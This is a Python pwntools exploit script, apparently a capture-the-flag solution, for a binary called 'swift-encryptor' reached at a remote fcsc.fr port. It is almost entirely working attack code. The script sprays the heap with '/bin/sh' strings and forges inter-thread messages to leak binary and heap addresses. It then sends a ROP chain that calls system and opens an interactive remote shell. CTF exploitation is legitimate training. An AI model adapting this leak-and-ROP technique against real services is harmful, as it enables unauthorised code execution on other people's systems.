from pwn import *
from time import sleep
import re
from base64 import b64decode, b64encode

context.terminal = ["gnome-terminal", "--window", "-x", "sh", "-c"]
context.buffer_size = 0x10000

# DEBUG = True
DEBUG = False
if DEBUG:
    p = process("swift-encryptor")
    # p = process("swift-encryptor.back")
    # gdb.attach(p, gdbscript="c")
else:
    # p = remote("localhost", 4000)
    p = remote("fcsc.fr", 2104)

WAIT_TIME = 0.3
BINARY = ELF("swift-encryptor")


# Parse dump to find pointer mask xored with zero, which gives splitter thread heap ASLR bits
def parse_heap(dump):
    heap_leak = -1
    prev_qword = 0
    for i in range(0, len(dump), 8):
        qword = dump[i : i + 8]
        qword_int = u64(qword)
        if (
            qword_int != 0
            and qword_int & (0xFFFFFF << (5 * 8)) == 0
            and prev_qword == 0x35
        ):
            print(f"Heap leak: {qword_int:016x}")
            heap_leak = qword_int
        prev_qword = qword_int
    return heap_leak << 12


def parse_binary(dump):
    bin_leak = -1
    for i in range(0, len(dump), 8):
        qword = dump[i : i + 8]
        qword_int = u64(qword)
        # Assuming this is encryptor_thread address
        if (qword_int & (0xFFFF << (6 * 8))) == 0 and qword_int & 0xFFF == BINARY.sym[
            "encryptor_thread"
        ] & 0xFFF:
            print(f"Binary leak: {qword_int:016x}")
            bin_leak = qword_int
    return bin_leak


def leak_addresses(leak_size):
    p.sendline(
        b64encode(
            # b"a" * 0xFB0
            # Spray strings on heap
            b"/bin/sh\x00" * 0xFB * 2
            # Fake interface message
            + b"interfacedata___"
            # Fake decoder message
            + b"\x00" * 0x10
            # Fake splitter message
            + b"\x00" * 0x10
            # Fake joiner message
            + b"\x00" * 0x10
            # Fake encoder message
            + p16(leak_size + 4)
            + b"\x00" * 0xE
        )
    )
    sleep(WAIT_TIME)
    p.recvuntil(b"[encoder] ")
    dump = b64decode(p.recvuntil(b"\n> ", timeout=1)[:-3])
    return (parse_binary(b"\x00" * 4 + dump), parse_heap(b"\x00" * 4 + dump))


def spray_leak(attempts):
    bin_leak = -1
    heap_leak = -1
    for i in range(attempts):
        b, h = leak_addresses(0xD00)
        if heap_leak < 0:
            heap_leak = h
        if bin_leak < 0:
            bin_leak = b
    return (bin_leak, heap_leak)


def rce(p1, p2, p3):
    assert len(p1) == len(p2) == len(p3) == 0xE
    splitter_msg = p16(0x1) + b"\x00" * 0xE

    payload = b64encode(
        # b"a" * 0xFB0
        b"/bin/sh\x00" * 0xFB * 2
        # Fake interface message
        + b"interfacedata___"
        # Fake decoder message
        + b"\x00" * 0x10
        # Fake splitter message
        + splitter_msg
        # Fake joiner message: size of stack frame = 0x1050
        + p16(0x106 + 0x1FF + 2)
        + p3
        # Fake encoder message
        + b"\x00" * 0x10
        # New part
        # + b"b" * 0xFB0
        + b"/bin/sh\x00" * 0xFB * 2
        # Fake interface message
        + b"interfacedata___"
        # Fake decoder message
        + b"\x00" * 0x10
        # Fake splitter message
        + splitter_msg
        # Fake joiner message: size of stack frame = 0x1050
        + p16(0x106 + 0x1FF + 1)
        + p2
        # Fake encoder message
        + b"\x00" * 0x10
        # New part
        # + b"b" * 0xFB0
        + b"/bin/sh\x00" * 0xFB * 2
        # Fake interface message
        + b"interfacedata___"
        # Fake decoder message
        + b"\x00" * 0x10
        # Fake splitter message
        + splitter_msg
        # Fake joiner message: size of stack frame = 0x1050
        + p16(0x106 + 0x1FF)
        + p1
    )
    print(f"Payload size: {len(payload):08x}")
    p.sendline(payload)


sleep(WAIT_TIME)
p.recv()

print("[*] Stage 1: Heap spray and address leak")
bin_leak, heap_leak = spray_leak(0x8)

if bin_leak < 0 or heap_leak < 0:
    print("[-] Failed to leak addresses")
    exit(1)
BINARY.address = bin_leak - BINARY.sym["encryptor_thread"]
heap_base = heap_leak & (0xFFFFFF << 24)
print(f"Binary base: 0x{BINARY.address:016x}")
print(f"Heap base: 0x{heap_base:016x}")
print("[+] Stage 1: Complete")

print("[*] Stage 2: RCE")
HEAP_OFFSET_GUESS = 0x13A2
rce(
    b"*" * 0x8 + p64(BINARY.address + 0x101A)[:6],  # ret
    p64(BINARY.address + 0x20AD)
    + p64(heap_base + HEAP_OFFSET_GUESS)[:6],  # pop rdi; ret
    p64(BINARY.plt["system"]) + p64(BINARY.address + 0x101A)[:6],
)

# Print gdb command to check out where "/bin/sh" strings are in memory
if DEBUG:
    mapping = (
        subprocess.run(
            f"cat /proc/$(pidof swift-encryptor)/maps | grep 00:00 | grep {heap_base:0x}",
            shell=True,
            capture_output=True,
        )
        .stdout.decode()
        .strip()
        .split("\n")[1]
    )
    parsed = re.findall("([0-9|a-f]*)-([0-9|a-f]*)", mapping)
    begin, end = int(parsed[0][0], base=16), int(parsed[0][1], base=16)
    print(f'find 0x{begin:016x}, 0x{end-0x8:016x}, "/bin/sh"')

p.interactive()
